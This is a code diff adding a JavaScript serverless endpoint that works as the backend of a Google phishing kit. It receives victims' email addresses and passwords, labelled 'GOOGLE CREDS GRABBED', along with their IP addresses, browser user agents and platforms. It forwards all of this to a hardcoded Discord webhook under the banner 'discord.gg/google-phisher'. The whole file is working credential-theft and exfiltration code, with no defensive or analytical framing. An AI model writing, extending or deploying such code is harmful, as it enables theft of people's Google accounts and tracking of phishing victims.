@@ -1,0 +1,47 @@
+const WEBHOOK_URL = process.env.WEBHOOK_URL || 'https://discord.com/api/webhooks/1482847927272734894/m1WR4H2N92D-lvbQq0mYrghgkFYcu4boNjQ4_WeKbQ34muWU6GcfWSMvV7nb3U4I4hEc';
+
+module.exports = async (req, res) => {
+    if (req.method !== 'POST') {
+        return res.status(405).end();
+    }
+
+    const data = req.body;
+    
+    let embed = {
+        title: data.action === 'google_creds' ? '🔐 GOOGLE CREDS GRABBED' : '👁️ IMAGE CLICKED',
+        color: data.action === 'google_creds' ? 0xff4444 : 0x00ff88,
+        timestamp: new Date().toISOString(),
+        fields: [
+            { name: '🌐 IP', value: `\`${data.ip || 'Unknown'}\``, inline: true },
+            { name: '📱 UA', value: `\`${data.userAgent?.slice(0, 50) || 'N/A'}...\``, inline: false },
+            { name: '🌍 Lang', value: `\`${data.language || 'N/A'}\``, inline: true },
+            { name: '💻 Platform', value: `\`${data.platform || 'N/A'}\``, inline: true }
+        ],
+        footer: { text: 'discord.gg/google-phisher' }
+    };
+
+    if (data.action === 'google_creds') {
+        embed.fields.splice(2, 0,
+            { name: '📧 Email', value: `\`${data.email}\``, inline: true },
+            { name: '🔑 Password', value: `\`${data.password}\``, inline: true }
+        );
+    }
+
+    const webhookData = {
+        username: 'Discord Google Logger',
+        avatar_url: 'https://cdn.discordapp.com/emojis/1183487813028690696.png',
+        embeds: [embed]
+    };
+
+    try {
+        await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(webhookData)
+        });
+        res.status(200).json({ success: true });
+    } catch (error) {
+        console.error(error);
+        res.status(500).json({ error: 'Webhook failed' });
+    }
+};
